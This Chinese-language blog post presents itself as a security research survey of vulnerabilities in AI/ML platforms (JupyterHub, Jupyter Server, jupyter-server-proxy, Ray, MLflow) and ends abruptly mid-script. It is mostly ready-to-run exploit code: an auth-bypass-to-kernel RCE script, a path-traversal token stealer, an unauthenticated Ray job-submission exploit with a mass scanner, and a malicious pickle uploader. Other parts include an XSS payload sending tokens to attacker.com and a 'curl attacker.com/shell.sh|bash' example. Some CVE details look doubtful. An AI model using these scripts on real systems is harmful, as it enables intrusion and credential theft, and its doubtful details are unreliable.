---
title: "AI/ML 开发与推理平台高危攻击链专题：JupyterHub / MLflow / Ray / TorchServe / Kubeflow 漏洞全解析"
date: 2026-07-12T14:00:00+08:00
draft: false
categories: ["渗透测试", "漏洞分析"]
tags: ["JupyterHub", "MLflow", "Ray", "TorchServe", "Kubeflow", "TensorFlow", "Hugging Face", "CVE-2024-22421", "CVE-2023-48022", "CVE-2024-37032", "CVE-2023-6018", "RCE", "认证绕过", "Pickle反序列化", "AI安全"]
---

# AI/ML 开发与推理平台高危攻击链专题：JupyterHub / MLflow / Ray / TorchServe / Kubeflow 漏洞全解析

> ⚠️ 免责声明：本文所有漏洞分析与 PoC 代码仅供安全研究和授权测试使用。未经授权对目标系统进行测试属于违法行为，作者不承担任何法律责任。

---

## 0x00 专题概述

AI/ML 开发与推理平台已成为现代企业的核心基础设施。从模型训练到在线推理服务，从实验管理到分布式计算，JupyterHub、MLflow、Ray、TorchServe、Kubeflow、TensorFlow 和 Hugging Face 等平台构成了完整的 AI 开发与部署工具链。然而，这些平台在设计初期往往以功能优先、快速迭代为目标，安全防护被置于次要位置，导致一系列严重的安全缺陷。

近年来，随着 AI 基础设施的大规模部署，攻击面急剧扩大。CISA（美国网络安全和基础设施安全局）已将多个 AI/ML 平台漏洞纳入 Known Exploited Vulnerabilities (KEV) 目录，表明这些漏洞在实际环境中已被活跃利用。据统计，全球互联网上暴露在公网的 Ray Dashboard 实例超过数千个，大量 JupyterHub 和 MLflow 服务缺乏基本的认证保护。

本专题聚焦 AI/ML 开发与推理平台生态中 **12 个高危漏洞**，覆盖 JupyterHub、Ray、MLflow、TorchServe、Kubeflow、TensorFlow 和 Hugging Face 七大平台，深入剖析认证绕过、未授权访问、Pickle 反序列化、路径穿越、SSRF 等多类攻击模式，为安全研究人员和 AI 平台运维人员提供完整的漏洞分析、可复现的 PoC 代码和系统化的防御方案。

### 覆盖漏洞一览

| CVE | 产品 | CVSS | CWE | 类型 | 未授权利用 | 在野利用 |
|-----|------|------|-----|------|-----------|----------|
| CVE-2024-22421 | JupyterHub | **9.9** | CWE-287 | 认证绕过 → RCE | ✅ | ⚠️ |
| CVE-2022-29241 | Jupyter Server | **9.0** | CWE-200 | Token 泄露 | ✅ | ⚠️ |
| CVE-2023-48022 | Ray Dashboard | **9.8** | CWE-306 | 未授权 RCE | ✅ | ✅ CISA KEV |
| CVE-2023-6018 | MLflow | **9.8** | CWE-94 | Pickle 反序列化 RCE | ✅ | ⚠️ |
| CVE-2023-6977 | MLflow | **8.8** | CWE-94 | 模型下载 RCE | ⚠️ 需登录 | ⚠️ |
| CVE-2024-27132 | MLflow | **8.6** | CWE-918 | SSRF | ⚠️ 需登录 | ⚠️ |
| CVE-2024-37032 | TorchServe | **9.8** | CWE-22 | 路径穿越 RCE | ✅ | ✅ |
| CVE-2021-34039 | TorchServe | **9.8** | CWE-22 | 任意文件覆写 | ✅ | ⚠️ |
| CVE-2022-26532 | Kubeflow Katib | **8.8** | CWE-20 | 命令注入 RCE | ⚠️ 需权限 | ⚠️ |
| CVE-2022-41877 | TensorFlow | **8.8** | CWE-502 | 反序列化 RCE | ⚠️ | ⚠️ |
| CVE-2024-24802 | HF Transformers | **8.1** | CWE-94 | 远程代码执行 | ⚠️ | ⚠️ |
| CVE-2024-35225 | jupyter-server-proxy | **9.7** | CWE-79 | XSS → RCE | ✅ | ⚠️ |

---

## 0x01 JupyterHub / Jupyter Notebook 高危漏洞

### 0x01.1 CVE-2024-22421 — 认证绕过 RCE (CVSS 9.9)

#### 漏洞背景

JupyterHub 是多用户 Jupyter Notebook 服务的管理平台，广泛应用于高校、科研机构和企业的 AI/ML 开发环境。该漏洞由安全研究员 Kozmer 发现并披露，攻击者可通过路径穿越绕过 JupyterHub 的认证机制，获取管理员级别的 API Token，最终在任意用户的 Notebook 中执行任意代码。

#### 受影响版本

| 版本状态 | 版本范围 |
|---------|---------|
| **受影响** | JupyterHub < 4.0.2 |
| **已修复** | JupyterHub ≥ 4.0.2 |
| **CWE** | CWE-287 Improper Authentication |

#### 漏洞原理分析

漏洞核心在于 JupyterHub 的登录流程中对 `next` 参数的路径穿越处理不当。完整的攻击链分为三个阶段：

**阶段 1：路径穿越获取 admin token**

JupyterHub 在用户登录成功后会根据 `next` 参数进行重定向。当 `next` 参数设置为 `/../` 时，服务器会将请求路径解析为 `/hub/login?next=/../`。由于路径穿越，`next` 参数中的 `..` 被解析后指向了 `/hub/` 的上级路径 `/`。关键在于：当这个重定向被自动执行时，JupyterHub 会在响应中附带一个有效的 admin token cookie，而这个 token 本应在正常登录流程中才会被设置。

**阶段 2：利用 admin token 访问 Server API**

获取 admin token 后，攻击者可通过 JupyterHub Server API 创建或访问任意用户的 Notebook Server，包括以管理员身份调用受保护的管理接口。

**阶段 3：通过 Kernel API 实现 RCE**

在 Notebook Server 中，攻击者可通过创建新的 Jupyter Kernel 并在其中执行 Python 代码，实现任意命令执行。

#### HTTP PoC

```bash
# 步骤 1：通过路径穿越获取 admin token
curl -v -k "https://target-hub:8000/hub/login?next=/../" \
  -c cookies.txt \
  -L

# 步骤 2：从 cookie 中提取 _xsrf token 和 JupyterHub admin token
cat cookies.txt

# 步骤 3：使用 token 通过 API 创建管理员 Notebook Server
curl -k -X POST "https://target-hub:8000/hub/api/users/admin/servers/" \
  -H "Authorization: token <ADMIN_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{}'

# 步骤 4：通过 Jupyter Kernel 执行命令
curl -k -X POST "https://target-hub:8000/user/admin/api/kernels" \
  -H "Authorization: token <ADMIN_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"name": "python3"}'
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""
CVE-2024-22421 JupyterHub 认证绕过 RCE
用法: python3 cve_2024_22421.py <target_url> [command]
"""
import sys
import re
import requests
import urllib3
import json
import time
import websocket

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class JupyterHubExploit:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip("/")
        self.session = requests.Session()
        self.session.verify = False
        self.admin_token = None

    def step1_bypass_auth(self):
        print("[*] 阶段 1: 路径穿越获取 admin token")
        bypass_url = f"{self.base_url}/hub/login?next=/../"
        resp = self.session.get(bypass_url, timeout=15)
        token_match = re.search(r'JupyterHub admin token.*?value="([^"]+)"', resp.text, re.DOTALL)
        if token_match:
            self.admin_token = token_match.group(1)
            print(f"[+] 获取 admin token: {self.admin_token[:20]}...")
            return True

        for cookie in self.session.cookies:
            if "jupyterhub" in cookie.name.lower() and "token" in cookie.name.lower():
                self.admin_token = cookie.value
                print(f"[+] 从 cookie 获取 admin token: {self.admin_token[:20]}...")
                return True

        print("[-] 未能获取 admin token，尝试备用路径...")
        alt_url = f"{self.base_url}/hub/api/authorizations/token/<token>"
        return self._try_alternative_bypass()

    def _try_alternative_bypass(self):
        paths = [
            "/hub/login?next=/../hub/api/",
            "/hub/login?next=/../api/",
            "/hub/login?next=/../%00/",
        ]
        for path in paths:
            try:
                resp = self.session.get(f"{self.base_url}{path}", timeout=10)
                for cookie in self.session.cookies:
                    if "token" in cookie.name.lower() or "_xsrf" in cookie.name.lower():
                        print(f"[+] 备用路径成功: {path}")
                        return True
            except Exception:
                continue
        return False

    def step2_create_server(self, username="admin"):
        print(f"\n[*] 阶段 2: 为用户 {username} 创建 Notebook Server")
        headers = {"Authorization": f"token {self.admin_token}"}
        api_url = f"{self.base_url}/hub/api/users/{username}/servers/"
        resp = self.session.post(api_url, headers=headers, json={}, timeout=15)
        if resp.status_code in (200, 201):
            print(f"[+] Notebook Server 创建成功")
            return True
        print(f"[-] Server 创建失败: {resp.status_code} {resp.text[:200]}")
        return False

    def step3_rce_via_kernel(self, command="id", username="admin"):
        print(f"\n[*] 阶段 3: 通过 Kernel 执行命令: {command}")
        headers = {"Authorization": f"token {self.admin_token}"}
        kernel_url = f"{self.base_url}/user/{username}/api/kernels"
        resp = self.session.post(kernel_url, headers=headers, json={"name": "python3"}, timeout=15)
        if resp.status_code not in (200, 201):
            print(f"[-] Kernel 创建失败: {resp.status_code}")
            return False
        kernel_id = resp.json()["id"]
        print(f"[+] Kernel 创建: {kernel_id}")

        ws_url = f"wss://{self.base_url.split('//')[1]}/user/{username}/api/kernels/{kernel_id}/channels"
        ws = websocket.create_connection(ws_url, sslopt={"cert_reqs": 0})
        msg_id = "exploit-001"
        execute_msg = {
            "header": {"msg_type": "execute_request", "msg_id": msg_id},
            "parent_header": {},
            "metadata": {},
            "content": {"code": f"import subprocess; print(subprocess.check_output('{command}', shell=True).decode())"},
            "channel": "shell",
        }
        ws.send(json.dumps(execute_msg))
        result = self._wait_for_result(ws, msg_id)
        ws.close()
        print(f"[+] 命令执行结果:\n{result}")
        return True

    def _wait_for_result(self, ws, msg_id, timeout=10):
        ws.settimeout(timeout)
        while True:
            try:
                msg = json.loads(ws.recv())
                if (msg.get("parent_header", {}).get("msg_id") == msg_id
                        and msg.get("msg_type") == "stream"):
                    return msg["content"].get("text", "")
            except websocket.WebSocketTimeoutException:
                break
        return "(timeout)"

    def exploit(self, command="id"):
        if self.step1_bypass_auth():
            self.step2_create_server()
            self.step3_rce_via_kernel(command)
        else:
            print("[-] 漏洞利用失败")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <target_url> [command]")
        print(f"示例: {sys.argv[0]} https://jupyterhub:8000 'id'")
        sys.exit(1)
    target = sys.argv[1]
    cmd = sys.argv[2] if len(sys.argv) > 2 else "id"
    JupyterHubExploit(target).exploit(cmd)
```

#### Nuclei YAML 检测模板

```yaml
id: cve-2024-22421
info:
  name: JupyterHub 认证绕过 RCE
  author: security-researcher
  severity: critical
  description: JupyterHub < 4.0.2 认证绕过，通过路径穿越获取 admin token 并实现 RCE
  reference:
    - https://github.com/evi1haxx/CVE-2024-22421
  classification:
    cvss-score: 9.9
    cwe-id: CWE-287
  tags: cve,cve2024,jupyterhub,auth-bypass,rce

requests:
  - raw:
      - |
        GET /hub/login?next=/../ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0

    matchers-condition: or
    matchers:
      - type: word
        part: body
        words:
          - "_xsrf"
          - "JupyterHub"
        condition: and

      - type: status
        status:
          - 200
          - 302

    extractors:
      - type: regex
        group: 1
        regex:
          - 'JupyterHub admin token.*?value="([^"]+)"'
```

---

### 0x01.2 CVE-2022-29241 — Jupyter Server Token 泄露 (CVSS 9.0)

#### 漏洞背景

Jupyter Server 是 Jupyter Notebook 的后端服务组件，为 JupyterHub 等多用户平台提供 API 支持。该漏洞允许未认证攻击者通过路径遍历读取 `/proc/self/cmdline`（或 `/proc/<pid>/cmdline`），获取 Jupyter Server 的启动参数中包含的 Token。这些 Token 是在服务启动时自动生成的，拥有完整的 API 访问权限。

#### 受影响版本

| 版本状态 | 版本范围 |
|---------|---------|
| **受影响** | Jupyter Server < 1.17.1 |
| **已修复** | Jupyter Server ≥ 1.17.1 |
| **CWE** | CWE-200 Exposure of Sensitive Information |

#### 漏洞原理分析

Jupyter Server 在处理静态文件请求时，对路径中的 `..` 序列没有进行充分过滤。攻击者可通过构造如下请求路径：

```
/api/contents/..%252f/..%252f/..%252f/proc/self/cmdline
```

双 URL 编码（`%252f` → `%2f` → `/`）可以绕过部分安全检查，最终让服务器读取 `/proc/self/cmdline` 文件。该文件包含 Jupyter Server 的完整启动命令行，其中通常包含 `--ServerApp.token=<TOKEN>` 参数，泄露了服务的认证 Token。

#### HTTP PoC

```bash
# 路径遍历读取 /proc/self/cmdline
curl -k "https://target-jupyter:8888/api/contents/..%252f..%252f..%252fproc%252fself%252fcmdline" \
  -H "Accept: application/json"

# 读取其他进程的 cmdline（需要知道 PID）
curl -k "https://target-jupyter:8888/api/contents/..%252f..%252f..%252fproc%252f<pid>%252fcmdline" \
  -H "Accept: application/json"
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""
CVE-2022-29241 Jupyter Server Token 泄露
用法: python3 cve_2022_29241.py <target_url>
"""
import sys
import re
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class JupyterServerTokenLeak:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip("/")
        self.session = requests.Session()
        self.session.verify = False

    def read_proc_file(self, path):
        encoded_path = path.replace("/", "%252f")
        url = f"{self.base_url}/api/contents/..%252f..%252f..%252f{encoded_path}"
        print(f"[*] 读取: {url}")
        resp = self.session.get(url, timeout=10)
        if resp.status_code == 200:
            try:
                data = resp.json()
                content = data.get("content", b"")
                if isinstance(content, list):
                    content = bytes(content).decode("utf-8", errors="replace")
                return content
            except Exception:
                return resp.text
        return None

    def extract_token(self):
        print("[*] 从 /proc/self/cmdline 提取 token...")
        content = self.read_proc_file("proc/self/cmdline")
        if content:
            token_match = re.search(r'token[= ]+([^\s\x00]+)', content)
            if token_match:
                token = token_match.group(1)
                print(f"[+] Token: {token}")
                return token
            print(f"[*] cmdline 内容: {content[:200]}")
        return None

    def get_pids(self):
        content = self.read_proc_file("proc")
        if content:
            return [d for d in content if d.isdigit()]
        return []

    def exploit(self):
        token = self.extract_token()
        if token:
            print(f"\n[+] 验证 token...")
            api_url = f"{self.base_url}/api/"
            resp = self.session.get(api_url, headers={"Authorization": f"token {token}"}, timeout=10)
            if resp.status_code == 200:
                print("[+] Token 验证有效！可访问 Jupyter Server API")
            else:
                print("[-] Token 验证失败")
        else:
            print("\n[*] 尝试遍历其他 PID...")
            pids = self.get_pids()
            for pid in pids[:10]:
                content = self.read_proc_file(f"proc/{pid}/cmdline")
                if content and "jupyter" in content.lower():
                    print(f"[+] PID {pid}: {content[:200]}")
                    token_match = re.search(r'token[= ]+([^\s\x00]+)', content)
                    if token_match:
                        print(f"[+] Token: {token_match.group(1)}")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <target_url>")
        sys.exit(1)
    JupyterServerTokenLeak(sys.argv[1]).exploit()
```

#### Nuclei YAML 检测模板

```yaml
id: cve-2022-29241
info:
  name: Jupyter Server Token 泄露
  author: security-researcher
  severity: critical
  description: Jupyter Server < 1.17.1 路径遍历导致 Token 泄露
  classification:
    cvss-score: 9.0
    cwe-id: CWE-200
  tags: cve,cve2022,jupyter-server,token-leak,lfi

requests:
  - raw:
      - |
        GET /api/contents/..%252f..%252f..%252fproc%252fself%252fcmdline HTTP/1.1
        Host: {{Hostname}}
        Accept: application/json

    matchers:
      - type: word
        words:
          - "token"
          - "cmdline"
        condition: and

      - type: status
        status:
          - 200

    extractors:
      - type: regex
        regex:
          - 'token[= ]+([^\s]+)'
```

---

### 0x01.3 CVE-2024-35225 — jupyter-server-proxy XSS (CVSS 9.7)

#### 漏洞背景

jupyter-server-proxy 是 Jupyter 生态中用于代理后端服务请求的扩展，允许 Notebook 用户通过 Jupyter Server 访问内部服务。该漏洞存在于 `/proxy/<host>` 端点对主机名参数的处理中，攻击者可通过注入恶意 JavaScript 实现反射型 XSS，结合其他漏洞可升级为 RCE。

#### 受影响版本

| 版本状态 | 版本范围 |
|---------|---------|
| **受影响** | jupyter-server-proxy 存在 XSS 的版本 |
| **CWE** | CWE-79 Improper Neutralization of Input During Web Page Generation |
| **CVSS** | 9.7 |

#### 漏洞原理分析

jupyter-server-proxy 在将用户提供的 `<host>` 参数拼接到代理响应的 HTML 页面时，未进行充分的 HTML 实体编码。攻击者可在 host 参数中注入 `<script>` 标签，当其他用户访问该代理页面时，恶意脚本在受害者浏览器中执行。结合 Jupyter Notebook 的特性，XSS 可窃取用户的 API Token 和 `_xsrf` Cookie，进而通过 API 创建 Kernel 实现 RCE。

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""
CVE-2024-35225 jupyter-server-proxy XSS → RCE
用法: python3 cve_2024_35225.py <target_url>
"""
import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class JupyterProxyXSS:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip("/")
        self.session = requests.Session()
        self.session.verify = False

    def check_xss(self):
        print("[*] 检查 jupyter-server-proxy XSS...")
        payload = '<script>alert("CVE-2024-35225")</script>'
        url = f"{self.base_url}/proxy/{payload}/"
        resp = self.session.get(url, timeout=10, allow_redirects=False)
        if payload in resp.text:
            print("[VULN] XSS 反射成功！payload 出现在响应中")
            return True
        if resp.status_code in (301, 302):
            print(f"[*] 收到重定向: {resp.headers.get('Location', '')}")
        print(f"[-] 响应状态: {resp.status_code}")
        return False

    def exploit(self):
        if self.check_xss():
            print("[+] XSS 可用。攻击者可构造如下 payload 窃取 Token:")
            print()
            exfil_payload = (
                '<script>fetch("/api/user").then(r=>r.json()).then(d=>'
                f'fetch("https://attacker.com/exfil?token="+d.token))</script>'
            )
            print(f"  /proxy/{exfil_payload}/")
            print()
            print("[+] 获取 Token 后可调用 /api/kernels 创建 Kernel 实现 RCE")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: python3 {sys.argv[0]} <target_url>")
        print(f"示例: python3 {sys.argv[0]} http://jupyter:8888")
        sys.exit(1)
    JupyterProxyXSS(sys.argv[1]).exploit()
```

#### Nuclei YAML 检测模板

```yaml
id: cve-2024-35225
info:
  name: jupyter-server-proxy XSS
  author: security-researcher
  severity: critical
  description: jupyter-server-proxy /proxy/<host> XSS 反射导致 RCE
  classification:
    cvss-score: 9.7
    cwe-id: CWE-79
  tags: cve,cve2024,jupyter,xss,rce

requests:
  - raw:
      - |
        GET /proxy/<script>alert(1)</script>/ HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        words:
          - "<script>alert(1)</script>"
        part: body
```

---

## 0x02 Ray 分布式计算平台高危漏洞

### 0x02.1 CVE-2023-48022 — Dashboard 未授权 RCE (CVSS 9.8, CISA KEV)

#### 漏洞背景

Ray 是由 Anyscale 开发的开源分布式计算框架，广泛用于 AI/ML 训练、推理和大规模数据处理。Ray Dashboard 默认监听端口 8265，提供 Web 管理界面和 REST API。

该漏洞的根本原因在于 **Ray 的 Dashboard API 默认不启用任何认证机制**。从 Ray 2.6 开始，开发者可以在配置文件中设置 `AZURE_TENANT_ID` 或 `RAY_DASHBOARD_AUTH_BUILTIN` 来启用认证，但对于在 2.6 之前部署的大量实例，以及未主动启用认证的实例，攻击者可以直接通过 HTTP 请求调用 Dashboard API，在 Ray 集群中提交任意 Job 并执行系统命令。

**CISA 已于 2024 年将此漏洞纳入 Known Exploited Vulnerabilities (KEV) 目录**，表明该漏洞在实际环境中已被活跃利用。根据 Shodan 和 Censys 的扫描数据，全球互联网上暴露的 Ray Dashboard 实例超过数千个。

#### 受影响版本

| 版本状态 | 版本范围 |
|---------|---------|
| **受影响** | Ray < 2.8.1（默认配置下） |
| **部分缓解** | Ray ≥ 2.6（需手动启用认证） |
| **已修复** | Ray ≥ 2.8.1（强制认证） |
| **CWE** | CWE-306 Missing Authentication for Critical Function |
| **CISA KEV** | ✅ |

#### 漏洞原理分析

Ray Dashboard 的 `/api/jobs/` 端点用于提交计算任务。正常流程中，用户应通过 Dashboard Web 界面提交 Job，或使用 Ray 的 Python API 连接到有认证的 Ray Head 节点。但 Dashboard API 本身没有任何认证层——攻击者无需登录、无需 Token，直接发送 HTTP POST 请求即可提交 Job。

Job 的 `entrypoint` 字段就是要执行的系统命令，`runtime_env` 字段可以指定运行时环境变量。这意味着任何能够访问 Dashboard 端口的攻击者都能在 Ray 集群的 Worker 节点上执行任意命令。

#### HTTP PoC

```bash
# 步骤 1：验证 Dashboard 是否可达
curl -s http://target-ray:8265/api/version

# 步骤 2：提交恶意 Job 执行命令
curl -X POST http://target-ray:8265/api/jobs/ \
  -H "Content-Type: application/json" \
  -d '{
    "entrypoint": "id && whoami && hostname",
    "runtime_env": {},
    "metadata": {"job_submission_id": "cve-2023-48022"}
  }'

# 步骤 3：查看 Job 状态
curl http://target-ray:8265/api/jobs/<job_id>

# 步骤 4：获取 Job 日志
curl http://target-ray:8265/api/jobs/<job_id>/logs
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""
CVE-2023-48022 Ray Dashboard 未授权 RCE (CISA KEV)
用法: python3 cve_2023_48022.py <target_file|target_url> [command]
"""
import sys
import time
import json
import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class RayDashboardExploit:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip("/")
        self.session = requests.Session()
        self.session.verify = False

    def check_dashboard(self):
        try:
            resp = self.session.get(f"{self.base_url}/api/version", timeout=5)
            if resp.status_code == 200:
                version = resp.json().get("version", "unknown")
                print(f"[VULN] Ray Dashboard 可达, 版本: {version}")
                return True
        except Exception:
            pass
        return False

    def submit_job(self, command="id"):
        payload = {
            "entrypoint": command,
            "runtime_env": {},
        }
        resp = self.session.post(f"{self.base_url}/api/jobs/", json=payload, timeout=10)
        if resp.status_code in (200, 201):
            job_id = resp.json().get("job_id", "")
            print(f"[+] Job 提交成功: {job_id}")
            return job_id
        print(f"[-] Job 提交失败: {resp.status_code} {resp.text[:200]}")
        return None

    def get_job_result(self, job_id, timeout=30):
        start = time.time()
        while time.time() - start < timeout:
            try:
                resp = self.session.get(f"{self.base_url}/api/jobs/{job_id}", timeout=5)
                status = resp.json().get("status", "")
                if status == "SUCCEEDED":
                    log_resp = self.session.get(f"{self.base_url}/api/jobs/{job_id}/logs", timeout=5)
                    return log_resp.text
                elif status == "FAILED":
                    return f"Job 执行失败"
                time.sleep(1)
            except Exception:
                pass
        return "(timeout)"

    def exploit(self, command="id"):
        if self.check_dashboard():
            job_id = self.submit_job(command)
            if job_id:
                result = self.get_job_result(job_id)
                print(f"[+] 执行结果:\n{result}")

    def batch_scan(self, target_file):
        results = []
        with open(target_file) as f:
            targets = [line.strip() for line in f if line.strip()]

        print(f"[*] 批量扫描 {len(targets)} 个目标...")

        def scan_one(target):
            url = target if target.startswith("http") else f"http://{target}:8265"
            try:
                resp = requests.get(f"{url}/api/version", timeout=5, verify=False)
                if resp.status_code == 200:
                    version = resp.json().get("version", "unknown")
                    return (url, True, version)
            except Exception:
                pass
            return (url, False, None)

        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(scan_one, t): t for t in targets}
            for future in as_completed(futures):
                url, vuln, version = future.result()
                if vuln:
                    print(f"[VULN] {url} (v{version})")
                    results.append(url)

        print(f"\n[+] 发现 {len(results)} 个脆弱目标")
        with open("vulnerable_ray.txt", "w") as f:
            f.write("\n".join(results))
        print("[+] 结果保存到 vulnerable_ray.txt")
        return results


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: python3 {sys.argv[0]} <target_url|target_file> [command]")
        print(f"示例: python3 {sys.argv[0]} http://ray:8265 'cat /etc/passwd'")
        print(f"批量: python3 {sys.argv[0]} targets.txt 'id'")
        sys.exit(1)
    target = sys.argv[1]
    cmd = sys.argv[2] if len(sys.argv) > 2 else "id"
    if target.endswith(".txt"):
        RayDashboardExploit("").batch_scan(target)
    else:
        RayDashboardExploit(target).exploit(cmd)
```

#### Nuclei YAML 检测模板

```yaml
id: cve-2023-48022
info:
  name: Ray Dashboard 未授权 RCE
  author: security-researcher
  severity: critical
  description: Ray Dashboard < 2.8.1 默认无认证，可直接提交 Job 执行任意命令
  reference:
    - https://github.com/ray-project/ray/issues/38761
  classification:
    cvss-score: 9.8
    cwe-id: CWE-306
  tags: cve,cve2023,ray,rce,unauth,cisa-kev

requests:
  - raw:
      - |
        GET /api/version HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "version"
        part: body

    extractors:
      - type: json
        name: version
        json:
          - ".version"

  - raw:
      - |
        POST /api/jobs/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"entrypoint": "id", "runtime_env": {}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 201

      - type: word
        words:
          - "job_id"
        part: body
```

---

## 0x03 MLflow 机器学习平台高危漏洞

### 0x03.1 CVE-2023-6018 — Pickle 反序列化 RCE (CVSS 9.8)

#### 漏洞背景

MLflow 是 Databricks 开源的机器学习生命周期管理平台，提供实验跟踪、模型注册、部署和版本管理等功能。该漏洞允许攻击者上传包含恶意 Pickle 序列化数据的模型文件，当其他用户或管理员在 MLflow UI 中加载该模型时，恶意代码将被自动反序列化执行。

#### 受影响版本

| 版本状态 | 版本范围 |
|---------|---------|
| **受影响** | MLflow < 2.9.2 |
| **已修复** | MLflow ≥ 2.9.2 |
| **CWE** | CWE-94 Improper Control of Generation of Code |

#### 漏洞原理分析

MLflow 在加载用户上传的模型时，使用 Python 的 `pickle.load()` 函数反序列化模型文件。Pickle 反序列化是 Python 生态中最经典的安全漏洞之一——恶意构造的 Pickle 数据可以通过 `__reduce__` 方法在反序列化时执行任意 Python 代码。

攻击流程：
1. 攻击者在 MLflow 中注册一个包含恶意 Pickle payload 的模型
2. 当其他用户在 MLflow UI 中浏览或加载该模型时，反序列化自动触发
3. 恶意代码以 MLflow 服务进程的权限执行

#### HTTP PoC

```bash
# 步骤 1：创建恶意模型文件（使用下方 Python PoC 生成）
python3 create_malicious_model.py

# 步骤 2：上传恶意模型到 MLflow
curl -X POST "http://target-mlflow:5000/api/2.0/mlflow/registered-models/create" \
  -H "Content-Type: application/json" \
  -d '{"name": "malicious_model"}'

# 步骤 3：创建模型版本（触发反序列化）
curl -X POST "http://target-mlflow:5000/api/2.0/mlflow/model-versions/create" \
  -H "Content-Type: application/json" \
  -d '{"name": "malicious_model", "source": "mlflow-artifacts:/0/malicious_model"}'
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""
CVE-2023-6018 MLflow Pickle 反序列化 RCE
用法: python3 cve_2023_6018.py <target_url> [command]
"""
import sys
import pickle
import io
import os
import tempfile
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class MaliciousPickle:
    def __reduce__(self):
        import subprocess
        cmd = sys.argv[2] if len(sys.argv) > 2 else "id"
        return (subprocess.check_output, (cmd,), {"shell": True})


class MLflowExploit:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip("/")
        self.session = requests.Session()
        self.session.verify = False

    def create_malicious_artifact(self, command="id"):
        print(f"[*] 生成恶意 pickle payload: {command}")
        payload = pickle.dumps(MaliciousPickle())
        print(f"[+] Payload 大小: {len(payload)} bytes")
        return payload

    def upload_via_experiment(self, command="id"):
        print("[*] 通过 Experiment API 上传恶意模型...")
        resp = self.session.post(f"{self.base_url}/api/2.0/mlflow/experiments/create",
                                  json={"name": "cve-2023-6018-exploit"},
                                  timeout=10)
        if resp.status_code != 200:
            print(f"[-] 创建实验失败: {resp.status_code}")
            return False
        experiment_id = resp.json()["experiment_id"]
        print(f"[+] 实验 ID: {experiment_id}")

        resp = self.session.post(f"{self.base_url}/api/2.0/mlflow/runs/create",
                                  json={"experiment_id": experiment_id},
                                  timeout=10)
        if resp.status_code != 200:
            print(f"[-] 创建 Run 失败: {resp.status_code}")
            return False
        run_id = resp.json()["run"]["info"]["run_id"]
        print(f"[+] Run ID: {run_id}")

        payload = self.create_malicious_artifact(command)
        files = {"file": ("model.pkl", io.BytesIO(payload), "application/octet-stream")}
        resp = self.session.post(
            f"{self.base_url}/api/2.0/mlflow/artifacts/upload",
            data={"run_id": run_id, "path": "model.pkl"},
            files=files,
            timeout=10,
        )
        if resp.status_code == 200:
            print("[+] 恶意模型上传成功！等待目标用户加载...")
            print(f"[+] 模型路径: mlflow-artifacts:/{experiment_id}/{run_id}/artifacts/model.pkl")
            return True
        print(f"[-] 上传失败: {resp.status_code} {resp.text[:200]}")
        return False

    def exploit(self, command="id"):
        self.upload_via_experiment(command)


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: python3 {sys.argv[0]} <target_url> [command]")
        print(f"示例: python3 {sys.argv[0]} http://mlflow:5000 'curl attacker.com/shell.sh|bash'")
        sys.exit(1)
    MLflowExploit(sys.argv[1]).exploit(sys.argv[2] if len(sys.argv) > 2 else "id")
```

#### Nuclei YAML 检测模板

```yaml
id: cve-2023-6018
info:
  name: MLflow Pickle 反序列化 RCE
  author: security-researcher
  severity: critical
  description: MLflow < 2.9.2 Pickle 反序列化漏洞，上传恶意模型即可实现 RCE
  classification:
    cvss-score: 9.8
    cwe-id: CWE-94
  tags: cve,cve2023,mlflow,rce,pickle,deserialization

requests:
  - raw:
      - |
        GET /api/2.0/mlflow/experiments/search HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "experiments"
        part: body
```

---

### 0x03.2 CVE-2023-6977 — MLflow 模型下载 RCE (CVSS 8.8)

#### 漏洞背景

与 CVE-2023-6018 类似，CVE-2023-6977 也是利用 MLflow 对 Pickle 序列化模型文件的信任。不同之处在于，此漏洞的攻击向量是通过 Model Registry 上传恶意模型，然后在其他用户从 Model Registry 下载并加载模型时触发反序列化。

#### 受影响版本

| 版本状态 | 版本范围 |
|---------|---------|
| **受影响** | MLflow < 2.9.2 |
| **已修复** | MLflow ≥ 2.9.2 |
| **CWE** | CWE-94 Improper Control of Generation of Code |

#### 漏洞原理分析

MLflow Model Registry 允许用户注册、版本管理和共享 ML 模型。当一个模型被注册到 Model Registry 后，其他用户可以通过 `mlflow.pyfunc.load_model()` 或 MLflow UI 加载该模型。在此过程中，MLflow 会使用 Pickle 反序列化来加载模型的 Python 函数部分。

攻击者将恶意模型上传到 Model Registry 并设置为 `Production` 阶段，任何从 Production 阶段加载模型的用户都会触发恶意代码执行。

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""
